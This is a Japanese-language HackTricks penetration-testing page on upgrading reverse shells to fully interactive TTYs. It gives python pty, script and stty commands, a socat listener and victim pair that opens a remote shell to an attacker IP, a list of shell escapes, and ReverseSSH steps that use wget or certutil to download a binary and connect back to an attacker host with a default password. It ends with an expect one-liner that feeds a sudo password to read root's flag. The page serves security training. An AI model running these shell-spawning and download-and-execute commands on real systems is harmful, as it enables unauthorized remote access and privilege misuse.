# Full TTYs

{{#include ../../banners/hacktricks-training.md}}

## Full TTY

`/etc/shells` には有効な login-shell のパス名が一覧表示され、一部のプログラムから参照されます。ただし、PTY の割り当てに必須となる普遍的な前提条件ではありません。<sup>[[3]](#references)[[4]](#references)</sup> `pkexec` などのプログラムが `SHELL` を `The value for the SHELL variable was not found in the /etc/shells file` というエラーで拒否する場合は、正確な shell のパス（例: `/bin/bash`）が `/etc/shells` に記載されていることを確認してください。<sup>[[10]](#references)</sup> 以下の `CTRL+Z`/`fg` による復旧手順は Bash の job control を使用します。現在の shell が Bash でない場合は、この手順を使用する前に Bash を起動してください。<sup>[[7]](#references)</sup>

#### Python

Python の `pty.spawn` は、現在のプロセスの標準入力、標準出力、標準エラーストリームに接続されたプログラムを起動します。これにより、このセッションで Bash に pseudo-terminal が提供されます。<sup>[[4]](#references)</sup>
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
> [!TIP]
> **`stty -a`** を実行すると、**行**と**列**の**数**を取得できます。`-a` は現在のすべての端末設定を出力します。このコマンドの出力は端末固有のものなので、現在のセッションで報告された値を使用してください。<sup>[[11]](#references)</sup>

#### script

`script` ユーティリティは端末セッションを記録します。ここでは、`/dev/null` が typescript を破棄し、`-q` が開始および完了メッセージを抑制し、`-c` がデフォルトの shell の代わりに Bash を実行します。<sup>[[5]](#references)</sup>
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
```
いずれかの PTY-spawn method の後、Netcat セッションを一時停止して local raw mode で復元し、その後 remote terminal の環境とサイズを設定します：
```bash
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat

listener は現在の terminal を raw mode で使用し、local echo を無効にした状態で port 4444 の TCP connections を受け入れます。victim command は pty を割り当て、stderr を結合し、session を作成し、SIGINT を転送して sane な terminal settings を適用します。child に controlling terminal が必要な場合は `ctty` を追加します。<sup>[[6]](#references)</sup>
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **シェルのSpawn**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap（`--interactive`を使用する古いバージョン）: `!sh`

Nmapのescapeはバージョン固有です。Nmapは後のリリースで`--interactive`モードを削除したため、`!sh`は古いバージョンにのみ適用されます。<sup>[[13]](#references)</sup>

## ReverseSSH

**interactive shell access**に加えて、**file transfers**や**port forwarding**にも便利な方法は、静的リンクされたssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh)をtargetに配置することです。<sup>[[1]](#references)</sup>

以下は、プロジェクトが公開しているUPX-compressed binaryを使用した`x86`の例です。その他のarchitectureやrelease artifactについては、[releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/)をナビゲーションとして使用してください。<sup>[[1]](#references)</sup>

1. incoming SSH connectionを受け取れるようにlocal hostを準備します。listener modeでは、`-l`でlistenerを有効にし、`-p 4444`でtargetのconnectionを受け付けるportを選択します。<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Linux target。`upx_reverse-sshx86` artifact を `/dev/shm/reverse-ssh` に転送し、実行可能にします。target の `-p 4444` は上記の listener port を選択し、`kali@10.0.0.2` は home へ接続する際に使用する account と host を指定します。<sup>[[1]](#references)</sup>
```bash
/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows target。Full interactive PowerShell には Windows 10 build 17763 が必要です。[project README](https://github.com/Fahrj/reverse-ssh#features) を参照してください。<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
Windowsの例では、`certutil`で`-f -urlcache`を使用しています。Microsoftのドキュメントでは、`-f`はURL fetchを強制するオプションとして説明されています。また、利用可能なパラメータはバージョンによって異なるため、この形式が利用できない場合は`certutil -?`を確認してください。<sup>[[12]](#references)</sup>

- reverse connectionが成功すると、ReverseSSHのreverse-mode listenerはデフォルトでポート`8888`（または`-b`で指定した値）にbindし、incoming connectionsではデフォルトパスワード`letmeinbrudipls`を使用して任意のusernameでログインできます。remote shellは、`reverse-ssh(.exe)`を起動したaccountのprivilegesで実行されます。<sup>[[1]](#references)</sup>
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) は Unix-like reverse shells を自動的に PTY にアップグレードし、Unix-like terminal のサイズを変更し、shell の操作をログに記録します。Windows shells には readline を提供しますが、real-time terminal resizing には対応していません。<sup>[[2]](#references)</sup>

![Penelope の reverse-shell handler interface](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

デフォルトでは `penelope` を実行すると `0.0.0.0:4444` で listen します。その後、受信した Unix-like shells は自動的にアップグレードされ、ログに記録されます。<sup>[[2]](#references)</sup>

![受信した shell を処理してアップグレードする Penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## No TTY

何らかの理由で full TTY を取得できない場合でも、**ユーザー入力を要求するプログラムと対話できます**。次の例では、Expect が `sudo` を起動し、パスワードプロンプトを待機してパスワードを送信し、`interact` によって制御を戻します。`sudo -S` は標準入力からパスワードを読み取ります。認可された lab でのみ使用し、実際の認証情報を shell history や source files に記録しないでください。<sup>[[8]](#references)[[9]](#references)</sup>
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## References

- [1] [ReverseSSH - CTFなど向けの reverse shell 機能を備えた静的リンク ssh server](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - 作業を簡単にするためのいくつかの処理を自動化する Shell handler](https://github.com/brightio/penelope)
- [3] [shells(5) — Linux マニュアルページ](https://man7.org/linux/man-pages/man5/shells.5.html)
- [4] [Python `pty` — Python ドキュメント](https://docs.python.org/3/library/pty.html)
- [5] [script(1) — Linux マニュアルページ](https://man7.org/linux/man-pages/man1/script.1.html)
- [6] [socat(1) — Linux マニュアルページ](https://man7.org/linux/man-pages/man1/socat.1.html)
- [7] [Bash Reference Manual — ジョブ制御](https://www.gnu.org/s/bash/manual/bash.html)
- [8] [sudo(8) — Linux マニュアルページ](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [9] [expect(1) — Linux マニュアルページ](https://man7.org/linux/man-pages/man1/expect.1.html)
- [10] [pkexec.c](https://github.com/polkit-org/polkit/blob/main/src/programs/pkexec.c)
- [11] [stty(1) — Linux マニュアルページ](https://man7.org/linux/man-pages/man1/stty.1.html)
- [12] [certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Nmap 変更履歴](https://nmap.org/changelog.html)
{{#include ../../banners/hacktricks-training.md}}
